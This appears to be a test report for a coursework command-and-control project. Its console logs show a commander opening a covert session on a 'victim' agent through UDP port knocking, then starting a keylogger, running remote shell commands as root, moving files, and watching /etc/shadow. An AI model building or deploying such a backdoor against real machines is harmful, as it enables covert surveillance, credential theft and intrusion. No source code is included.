# Project 1

# Testing


[**Tests 4**](#tests)

[Test 1 4](#test-1)

[Test 2 5](#test-2)

[Test 3 5](#test-3)

[Test 4 6](#test-4)

[Test 5 6](#test-5)

[Test 6 7](#test-6)

[Test 7 7](#test-7)

[Test 8 8](#test-8)

[Test 9 8](#test-9)

[Test 10 9](#test-10)

[Test 11 9](#test-11)

[Test 12 10](#test-12)

[Test 13 10](#test-13)

[Test 14 11](#test-14)

[Test 15 11](#test-15)

[Test 16 12](#test-16)

[Test 17 12](#test-17)

| Test | Description | Expected | Actual | Screenshot |
| ----- | ----- | ----- | ----- | ----- |
| No arguments | Commander starts with default IP 127.0.0.1, disconnected menu shown | Menu shown | Menu shown | [Test 1](#test-1) |
| --help | Usage message printed | Usage printed | Usage printed | [Test 2](#test-2) |
| Invalid IP | Error message, usage printed | Error shown | Error shown | [Test 3](#test-3) |
| Valid IP argument | Commander starts with specified IP | IP updated | IP updated | [Test 4](#test-4) |
| --connect flag | Auto-connects on startup | Session active | Session active | [Test 5](#test-5) |
| Commander invalid menu input | Error message, menu re-displayed | Error shown | Error shown | [Test 6](#test-6) |
| Port knock | 3 UDP packets to 5001, 5002, 5003, victim accepts | Knock accepted | Knock accepted | [Test 7](#test-7) |
| Heartbeat | Commander sends heartbeat, victim responds OK | Heartbeat ok | Heartbeat ok | [Test 8](#test-8) |
| Keylogger start/stop | Victim starts logging keystrokes, log file created | Keylog file created | Keylog file created | [Test 9](#test-9) |
| Remote command execution | Command runs on victim, output streamed back | Output displayed | Output displayed | [Test 10](#test-10) |
| File upload (Commander→Victim) | File transferred and stored on victim | File verified | File verified | [Test 11](#test-11) |
| File download (Victim→Commander) | File fetched from victim, stored locally | File verified | File verified | [Test 12](#test-12) |
| File watch | Changes to watched file trigger alert | Alert received | Alert received | [Test 13](#test-13) |
| Directory watch | Changes to watched directory trigger alert | Alert received | Alert received | [Test 14](#test-14) |
| /etc/shadow watch | Shadow file watched with snapshot-based change detection | Detected | Detected | [Test 15](#test-15) |
| Disconnect | Session closes cleanly, commander returns to disconnected menu | Disconnected | Disconnected | [Test 16](#test-16) |
| Uninstall | Victim acknowledges, exits cleanly, commander exits | Both exit | Both exit | [Test 17](#test-17) |

# Tests {#tests}

## Test 1 {#test-1}

*No arguments — Commander starts with default IP (127.0.0.1)*

```
$ ./commander
Commander started
Collector listening on UDP port 9999

Commander Menu
Victim: 127.0.0.1
1. Connect to victim
2. Set victim IP
3. Exit
>
```

The commander initializes, starts the collector listener on UDP 9999, and presents the disconnected menu with the default victim IP of 127.0.0.1.

## Test 2 {#test-2}

*--help flag — Usage message printed*

```
$ ./commander --help
Usage: ./commander [victim_ip] [--connect]
  victim_ip   IPv4 address of the victim. Defaults to 127.0.0.1.
  --connect   Port-knock and open the session before showing the menu.
```

The usage message displays supported arguments and the default behavior.

## Test 3 {#test-3}

*Invalid IPv4 address — Error and usage*

```
$ ./commander not_an_ip
Invalid IPv4 address or option: not_an_ip
Usage: ./commander [victim_ip] [--connect]
...
```

Non-IP arguments that are not recognized flags produce an error and usage.

## Test 4 {#test-4}

*Valid IP argument — Commander starts with specified IP*

```
$ ./commander 192.168.1.100
Commander started
Collector listening on UDP port 9999

Commander Menu
Victim: 192.168.1.100
...
>
```

The victim IP in the menu reflects the provided argument.

## Test 5 {#test-5}

*--connect flag — Auto-connection on startup*

```
$ ./commander 127.0.0.1 --connect
Commander started
Collector listening on UDP port 9999
Connecting to 127.0.0.1...
Port-knocking 127.0.0.1 on UDP ports 5001 5002 5003
Session active with 127.0.0.1

Commander Session
Connected to 127.0.0.1:7777
...
>
```

The commander performs the port knock sequence and opens a session before the first menu prompt.

## Test 6 {#test-6}

*Invalid menu input — Error message*

```
> abc
Invalid menu choice

Commander Menu
...
>
```

Non-numeric input produces an error and re-displays the menu. Out-of-range numbers also produce errors.

## Test 7 {#test-7}

*Port knock sequence — Victim acceptor logs*

**Victim console:**
```
Victim agent started (pcap-based knock detection)
DEBUG: pcap opened, DLT=X
Accepted knock 1/3 from 127.0.0.1 (verified IP ID 0xXXXX)
Accepted knock 2/3 from 127.0.0.1 (verified IP ID 0xXXXX)
Accepted knock 3/3 from 127.0.0.1 (verified IP ID 0xXXXX)
Session opened for 127.0.0.1 on UDP port 7777 (pcap-based)
```

**Commander console:**
```
Port-knocking 127.0.0.1 on UDP ports 5001 5002 5003
Session active with 127.0.0.1
```

The victim correctly detects and validates the knock sequence, then activates the session. The commander opens the session and enters the connected menu.

## Test 8 {#test-8}

*Heartbeat command*

```
> 9
Victim ACK: heartbeat ok
```

The heartbeat command receives an ACK response with payload "heartbeat ok" from the victim.

## Test 9 {#test-9}

*Keylogger start and stop*

```
> 1
Keyboard device path [auto]:
Victim OK: keylogger started for event-tap
```
*(on macOS; on Linux the device path shown is /dev/input/event0)*

```
> 2
Victim OK: keylogger stopped
> 3
Local path for the victim keylog file [victim_keylog.log]:
Requesting /tmp/victim_keylog.log from victim...
Victim OK: transferred /tmp/victim_keylog.log
```

The keylogger starts, stops, and the keylog file is successfully transferred to the commander. The file contains captured keystrokes with START/STOP timestamps.

## Test 10 {#test-10}

*Remote command execution*

```
> 8
Program/command to run on victim: whoami
Victim output:
root
Victim OK: command exited with status 0
```

The command runs on the victim via `/bin/sh -c whoami`. Output is captured from the pipe and streamed back. Exit status 0 indicates success.

```
> 8
Program/command to run on victim: ls /nonexistent
Victim output:
ls: cannot access '/nonexistent': No such file or directory
Victim ERROR: command exited with status 2
```

Commands that fail produce error output with the non-zero exit status.

## Test 11 {#test-11}

*File upload from Commander to Victim*

```
> 4
Local source path: test_upload.txt
Remote destination path on victim [test_upload.txt]:
Victim OK: stored file at test_upload.txt
```

A file is transferred in chunks via CMD_FILE_PUT_BEGIN, CMD_FILE_PUT_CHUNK, and CMD_FILE_PUT_END. The victim writes to a `.part` temp file and renames on completion. The file contents match the original.

## Test 12 {#test-12}

*File download from Victim to Commander*

```
> 5
Remote file path on victim: /etc/hostname
Local destination path [hostname]: test_download.txt
Requesting /etc/hostname from victim...
Victim OK: transferred /etc/hostname
```

The file is fetched via CMD_FILE_GET and streamed back in CMD_FILE_DATA chunks. The local file matches the remote file contents.

## Test 13 {#test-13}

*File watch with change detection*

```
> 6
Remote file path to watch: /tmp/watch_test.txt
Victim OK: watching file /tmp/watch_test.txt
```

After creating or modifying `/tmp/watch_test.txt` on the victim:

```
[collector] Alert: File watch: /tmp/watch_test.txt (changed (size=12))
```

Changes to the watched file are detected via `stat()` polling and reported asynchronously on the collector port.

## Test 14 {#test-14}

*Directory watch with change detection*

```
> 7
Remote directory path to watch: /tmp/watch_dir
Victim OK: watching directory /tmp/watch_dir
```

After creating a file inside `/tmp/watch_dir` on the victim:

```
[collector] Alert: Directory watch: /tmp/watch_dir (directory contents changed)
```

Directory changes are detected via content-hash comparison. The FNV-1a-based signature includes sorted entry names, mtime, size, and mode — any change triggers an alert.

## Test 15 {#test-15}

*/etc/shadow snapshot*

```
> 6
Remote file path to watch: /etc/shadow
Victim OK: watching file /etc/shadow
```

The victim captures a snapshot of `/etc/shadow` contents. On subsequent changes, the victim compares user entries and reports specific additions/removals (e.g., "changed - new user alice, removed user bob") or falls back to size-based change notification.

## Test 16 {#test-16}

*Disconnect*

```
> 10
Victim ACK: disconnect ok
```

**Victim console:**
```
Session closed: commander disconnected
```

The session closes cleanly. The victim returns to pcap-based knock detection. The commander returns to the disconnected menu.

## Test 17 {#test-17}

*Uninstall*

```
> 11
Victim ACK: uninstall ok
Uninstall acknowledged; closing commander session
Commander exiting
```

**Victim console:**
```
Session closed: uninstall requested
Victim agent exiting
```

Both processes exit cleanly. The victim sends an ACK, deactivates the session, and terminates. The commander closes and exits.
